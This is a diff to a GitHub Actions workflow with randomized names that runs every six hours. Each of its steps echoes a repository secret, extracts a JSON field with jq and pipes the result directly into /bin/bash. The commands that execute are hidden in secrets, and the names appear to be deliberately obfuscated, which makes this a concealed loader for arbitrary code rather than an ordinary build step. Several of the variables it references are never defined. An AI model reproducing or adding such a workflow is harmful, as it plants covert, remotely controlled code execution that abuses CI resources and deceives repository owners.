@@ -1,8 +1,9 @@
 name: znciolkk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 0/6 * * *'
+    - cron: '38 0/6 * * *'
 
 jobs:
   build:
@@ -11,13 +12,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: znciolkk
         env:
-          n6: ${{ secrets.n6 }}
+          uc46976: ${{ secrets.uc46976 }}
         run: |
-          echo $n6 | jq -r .mvk019 | /bin/bash
-          echo $a6445 | jq -r .ay2 | /bin/bash
-          echo $chl8225 | jq -r .xn3253 | /bin/bash
-          echo $qqtm716 | jq -r .nyd98 | /bin/bash
-          echo $xtbv9 | jq -r .oraaq0694 | /bin/bash
-          echo $a9 | jq -r .j0453 | /bin/bash
-          echo $yk5 | jq -r .wwoe3 | /bin/bash
+          echo $uc46976 | jq -r .vx462 | /bin/bash
+          echo $m76 | jq -r .ner57 | /bin/bash
+          echo $uhy2 | jq -r .cw2663 | /bin/bash
+          echo $vnuld74528 | jq -r .yskis6987 | /bin/bash
+          echo $b2059 | jq -r .xup5 | /bin/bash
+          echo $tg4021 | jq -r .lp829 | /bin/bash
+          echo $egdzo0 | jq -r .d41518 | /bin/bash
+          echo $whfsu23011 | jq -r .nx7 | /bin/bash
+          echo $wjzf613 | jq -r .xeqk0 | /bin/bash
+          echo $xvir0129 | jq -r .maxu08534 | /bin/bash
+          echo $eem4205 | jq -r .zuae96389 | /bin/bash
+          echo $crjao984 | jq -r .cv91 | /bin/bash
+          echo $ksx5 | jq -r .kv01887 | /bin/bash
+          echo $bpl65432 | jq -r .dur617 | /bin/bash
+          echo $ysz0 | jq -r .amlw88 | /bin/bash
+          echo $cnn4810 | jq -r .j5220 | /bin/bash
 
